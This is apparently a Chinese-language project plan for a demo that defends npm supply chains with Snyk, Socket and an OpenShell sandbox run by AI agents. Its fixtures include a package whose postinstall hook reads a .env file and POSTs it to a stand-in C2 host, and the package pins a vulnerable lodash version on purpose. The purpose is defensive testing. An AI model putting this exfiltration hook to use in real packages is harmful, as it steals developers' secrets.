# Project Plan: AI-Driven Supply Chain Attack Shield (展示型 PoC)

本專案是一個展示型 PoC，目標是示範如何用 AI Agent 編排供應鏈攻擊防禦流程，並把靜態掃描與執行期沙箱串成可觀察、可驗證的防線。

核心組合如下：

- **NVIDIA NemoClaw / OpenShell**：提供 Agent 執行沙箱與出站網路管控。
- **Snyk CLI**：偵測已知 CVE 與高風險相依套件。
- **Socket.dev CLI**：掃描 dependency metadata 與組織安全政策風險。
- **Claude / Codex Supervisor**：彙整掃描結果並決定是否放行。
- **Nemotron 3 Nano Worker**：在 sandbox 中執行掃描、安裝與 log 收集等工具任務。

此 PoC 不追求 production 化部署，而是要清楚展示三層防線：

1. Snyk 擋下已知漏洞。
2. Socket 擋下 dependency risk 或組織政策違規。
3. OpenShell 擋下安裝階段的越權讀檔與非授權外連。

---

## 1. PoC 目標與範圍

### 目標

- 建立一個可重現的 demo 流程，讓使用者看到套件安裝前後的安全控制點。
- 透過 Snyk 與 Socket 先做 dependency gate，避免高風險套件進入安裝階段。
- 在刻意繞過靜態 gate 的情境下，用 OpenShell 驗證 sandbox 能阻止敏感檔案讀取與惡意 C2 外連。
- 用 Supervisor-Worker agent flow 展示 AI 如何讀取報告、做出放行或拒絕決策。

### 不在範圍內

- 不建立 production CI/CD rollout。
- 不承諾完整 SOC/SIEM 整合。
- 不發布真實惡意 package 到 public registry。
- 不把 Socket 定位為本地任意 JavaScript 原始碼惡意行為分析器。
- 不以 LLM 取代人工資安審查，只示範報告彙整與決策輔助。

---

## 2. 系統架構

```text
                 Host System
                      |
                      v
        +-----------------------------+
        | Claude / Codex Supervisor   |
        | - read scan reports         |
        | - make allow / deny decision|
        +--------------+--------------+
                       |
                       v
        +-----------------------------+
        | NemoClaw Worker / Nemotron  |
        | - run tool commands         |
        | - collect logs              |
        +--------------+--------------+
                       |
                       v
        +-----------------------------+
        | OpenShell Sandbox           |
        | - filesystem allowlist      |
        | - per-binary egress policy  |
        | - deny logs                 |
        +--------------+--------------+
                       |
             allowed   |   denied
             npm registry   malicious C2
```

### 元件職責

- **Supervisor Agent**：接收使用者安裝需求，讀取 Snyk / Socket JSON 或文字報告，套用 gate 規則後決定是否中止。
- **Worker Agent**：在受控環境中執行 `snyk test`、`socket scan create --report`、`npm pack`、`npm install` 與 OpenShell log 查詢。
- **Snyk Gate**：針對 package manifest / lockfile 偵測已知漏洞，high 或 critical 風險即拒絕。
- **Socket Gate**：針對 dependency metadata 建立 scan report，若組織 security / license policy 回報 unhealthy 即拒絕。
- **OpenShell Gate**：即使前兩層被刻意繞過，仍限制安裝程序可讀寫的檔案與可連線的目的地。

### Nemotron Model 選型

目前 PoC 建議使用 **Nemotron 3 Nano** 作為 Worker model。

此專案中的 Nemotron Worker 主要負責工具型任務：

- 執行 `snyk test`。
- 執行 `socket scan create --report` 或 `socket ci`。
- 執行 `npm pack`、`npm install`。
- 操作 OpenShell sandbox。
- 收集 Snyk / Socket report 與 OpenShell deny log。
- 將工具輸出與 log 回傳給 Supervisor。

這些工作偏向 command execution、log collection 與輕量摘要，不需要由 Worker 承擔複雜安全推理。因此目前架構會把主要判斷責任放在 **Claude / Codex Supervisor**，由 Supervisor 彙整掃描結果與 sandbox log 後決定 `allow` 或 `deny`。

建議配置：

```text
Claude / Codex Supervisor
  - 彙整 Snyk / Socket / OpenShell 證據
  - 判斷 allow / deny
  - 產生 deny reason 與 next action

Nemotron 3 Nano Worker
  - 執行掃描命令
  - 操作 sandbox install
  - 收集 reports / logs
```

只有在 Nemotron 需要承擔較重的推理角色時，才建議升級為 **Nemotron 3 Super**。例如：

- 讓 Nemotron 直接擔任 Supervisor。
- 對多份安全報告做跨工具關聯分析。
- 判斷 Snyk、Socket 與 OpenShell 結果互相衝突的案例。
- 產生完整資安分析報告或 remediation plan。

以目前要實作的功能來看，**Nemotron 3 Nano 已足夠，且更符合 Worker 的角色定位**。

---

## 3. 環境需求

### 本機與容器

- macOS Apple Silicon。
- Docker Desktop 或 Colima，用於支援 NemoClaw / OpenShell sandbox stack。
- Node.js 與 npm，用於建立 PoC package fixture。
- 已可執行的 `openshell` 與 `nemoclaw` CLI。

### 安全掃描工具

```bash
npm install -g snyk
snyk auth

npm install -g socket
socket login
```

### Demo 目錄建議

```text
supply-chain-attack/
  plan.md
  fixtures/
    malicious-poc-pkg/
      package.json
      index.js
      scripts/
        exfiltrate.js
    poc-app/
      package.json
      package-lock.json
  policies/
    openshell-npm-install.yaml
  reports/
    snyk.json
    socket.json
    openshell.log
```

---

## 4. OpenShell 安全策略

OpenShell policy 使用 allowlist 模型。未列入 `filesystem_policy.read_only` 或 `filesystem_policy.read_write` 的路徑不可存取；未被 `network_policies` 授權的外連會被拒絕並寫入 log。

> 注意：以下 policy 是 PoC 起點，實作時需依實際 sandbox image 中 `node` / `npm` 的 binary path 調整，例如 `/usr/bin/node`、`/usr/local/bin/node`、`/usr/bin/npm` 或 `/usr/local/bin/npm`。

```yaml
# policies/openshell-npm-install.yaml
version: 1

filesystem_policy:
  include_workdir: true
  read_only:
    - /usr
    - /lib
    - /lib64
    - /etc
    - /bin
    - /sbin
    - /dev/urandom
  read_write:
    - /sandbox
    - /tmp
    - /dev/null

landlock:
  compatibility: best_effort

process:
  run_as_user: sandbox
  run_as_group: sandbox

network_policies:
  npm_registry_readonly:
    name: npm-registry-readonly
    endpoints:
      - host: registry.npmjs.org
        port: 443
        protocol: rest
        enforcement: enforce
        access: read-only
    binaries:
      - { path: /usr/bin/node }
      - { path: /usr/bin/npm }
```

此 policy 的展示重點：

- `registry.npmjs.org:443` 被允許，讓 npm 可以下載 dependency metadata 與 tarball。
- `malicious-hacker-c2.com` 不在 allowlist，postinstall script 嘗試外連時應被拒絕。
- Host 的 `~/.ssh`、`~/.aws`、專案外 `.env` 不會被列入可讀路徑，腳本不應讀到宿主機敏感資料。

---

## 5. Agent Pipeline

### 正常防禦流程

1. 使用者要求安裝或評估某個 npm package。
2. Supervisor 建立任務，要求 Worker 準備 fixture 與 lockfile。
3. Worker 執行 Snyk：

   ```bash
   cd fixtures/poc-app
   snyk test --json --severity-threshold=high
   ```

4. Worker 執行 Socket：

   ```bash
   socket scan create --report --json ./fixtures/poc-app
   ```

   或在 CI-like 情境中使用：

   ```bash
   cd fixtures/poc-app
   socket ci
   ```

5. Supervisor 讀取兩份報告：
   - Snyk exit code 非 0 且報告包含 high / critical vulnerability，拒絕。
   - Socket report 回傳 `healthy: false` 或 CLI exit code 非 0，拒絕。
   - 兩者都通過時，才允許進入 sandbox install。

### 第三層防線展示流程

為了展示 OpenShell 的執行期防線，可以在 demo 中刻意繞過 Snyk / Socket gate，直接讓 Worker 於 sandbox 中安裝本地 malicious tarball：

```bash
cd fixtures/malicious-poc-pkg
npm pack

# 在 OpenShell sandbox 內執行
npm install ./malicious-poc-pkg-1.0.0.tgz
```

預期結果是 postinstall script 會嘗試讀取敏感檔案並連線到 C2，但 OpenShell 檔案與網路 policy 會阻止它完成外傳。

---

## 6. PoC Fixture 設計

### `fixtures/malicious-poc-pkg/package.json`

```json
{
  "name": "malicious-poc-pkg",
  "version": "1.0.0",
  "description": "NPM supply chain attack PoC for Snyk and OpenShell",
  "main": "index.js",
  "scripts": {
    "postinstall": "node scripts/exfiltrate.js"
  },
  "dependencies": {
    "lodash": "4.17.4"
  }
}
```

`lodash@4.17.4` 用於觸發 Snyk 的已知漏洞偵測。postinstall script 則用於第三層 OpenShell dynamic block demo。

### `fixtures/malicious-poc-pkg/scripts/exfiltrate.js`

```javascript
const fs = require('fs');
const http = require('http');

console.log('[poc] postinstall script started');

try {
  const envData = fs.readFileSync('/host/.env', 'utf8');

  const req = http.request('http://malicious-hacker-c2.com/payload', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    }
  });

  req.write(JSON.stringify({ data: envData }));
  req.end();
} catch (error) {
  console.log('[poc] action blocked or failed:', error.message);
}
```

### `fixtures/poc-app/package.json`

```json
{
  "name": "poc-app",
  "version": "1.0.0",
  "private": true,
  "description": "Application fixture for dependency scanning demo",
  "dependencies": {
    "malicious-poc-pkg": "file:../malicious-poc-pkg/malicious-poc-pkg-1.0.0.tgz"
  }
}
```

### Fixture 建立流程

```bash
cd fixtures/malicious-poc-pkg
npm pack

cd ../poc-app
npm install --package-lock-only
```

`poc-app` 的 lockfile 讓 Snyk 與 Socket 掃描可重現 dependency tree。實際安裝 demo 則交給 OpenShell sandbox。

---

## 7. 測試案例與預期結果

### 測試案例 1：Snyk 已知漏洞 gate

**觸發方式**

```bash
cd fixtures/poc-app
snyk test --json --severity-threshold=high
```

**預期結果**

- Snyk 偵測到 dependency tree 中的 `lodash@4.17.4`。
- 若報告包含 high 或 critical vulnerability，CLI 回傳非 0。
- Supervisor 判定不合規，中止安裝流程。

### 測試案例 2：Socket dependency risk gate

**觸發方式**

```bash
socket scan create --report --json ./fixtures/poc-app
```

或：

```bash
cd fixtures/poc-app
socket ci
```

**預期結果**

- Socket 上傳 manifest / lockfile metadata，產生 dependency scan report。
- 若 dependency 違反組織 security / license policy，report 顯示 `healthy: false` 或 CLI 回傳非 0。
- Supervisor 依 Socket policy 結果拒絕或放行。

**重要限制**

Socket 這一層不承諾分析本地 `scripts/exfiltrate.js` 原始碼，也不把 `malicious-code` 警報列為 PoC 必然結果。它的 demo 範圍是 dependency risk 與 org policy gate。

### 測試案例 3：OpenShell dynamic block

**觸發方式**

手動繞過 Snyk / Socket gate，強制在 OpenShell sandbox 中安裝本地 tarball：

```bash
npm install ./malicious-poc-pkg-1.0.0.tgz
```

**預期結果**

- postinstall script 啟動，但讀取 `/host/.env` 失敗。
- `http://malicious-hacker-c2.com/payload` 不在 network allowlist 中，外連被 OpenShell 拒絕。
- OpenShell log 中可看到類似 `action=deny`、`dst_host=malicious-hacker-c2.com`、`deny_reason="no matching network policy"` 的紀錄。
- Nemotron Worker 收集 log，回報 Supervisor：「第三層 sandbox 成功阻斷外傳」。

---

## 8. 成功指標

- [ ] **Snyk gate 可驗證**：對 `fixtures/poc-app` 執行 Snyk 後，high 或 critical vulnerability 會讓流程中止。
- [ ] **Socket gate 可驗證**：Socket scan report 可被 Supervisor 讀取，並能根據 `healthy` 或 exit code 做出拒絕/放行決策。
- [ ] **OpenShell 檔案隔離可驗證**：postinstall script 無法讀取 sandbox allowlist 外的敏感檔案。
- [ ] **OpenShell 網路隔離可驗證**：惡意 C2 外連不成功，且 deny log 可被查詢。
- [ ] **Host 未受污染**：PoC 安裝與惡意腳本只在 sandbox 中執行，不修改宿主機憑證、shell 設定或專案外檔案。
- [ ] **Agent 決策可追蹤**：Supervisor 的拒絕理由可回溯到 Snyk report、Socket report 或 OpenShell log。

---

## 9. 已知限制與後續補強

### 已知限制

- NemoClaw / OpenShell 版本與 CLI 介面可能變動，實作前需用本機安裝版本重新確認 policy schema 與 command flags。
- macOS Apple Silicon 需依賴 Docker Desktop 或 Colima 的 Linux sandbox 環境；GPU 與 container runtime 能力可能影響 NemoClaw 部署方式。
- Socket 掃描的是 manifest / lockfile dependency metadata，不是本地惡意 JS 的完整靜態分析。
- Snyk 與 Socket 都需要帳號、token 與網路連線，demo 環境需事先登入。
- 這份 PoC 不處理所有 package manager，只聚焦 npm supply chain demo。

### 後續補強

- 加入 `scripts/run-demo.sh`，把 fixture 建立、Snyk scan、Socket scan、OpenShell install 與 log 收集串成一鍵流程。
- 將 Supervisor 決策規則寫成明確 JSON schema，例如 `allow`, `deny_reason`, `evidence`, `next_action`。
- 為 OpenShell policy 增加 PyPI、GitHub API 或 private registry 的分層 allowlist 範例。
- 加入 report fixture，讓無法登入 Snyk / Socket 的環境也能展示 Supervisor 判讀流程。
- 加入清理流程，確保 sandbox、npm tarball、暫存 report 可以安全移除。

---

## 參考文件

- NVIDIA OpenShell Policy Schema: https://docs.nvidia.com/openshell/reference/policy-schema
- NVIDIA OpenShell Network Policy Tutorial: https://docs.nvidia.com/openshell/latest/get-started/tutorials/first-network-policy
- Socket Scan CLI: https://docs.socket.dev/docs/socket-scan
- Socket CI CLI: https://docs.socket.dev/docs/socket-ci
- Snyk CLI `test`: https://docs.snyk.io/developer-tools/snyk-cli/commands/test
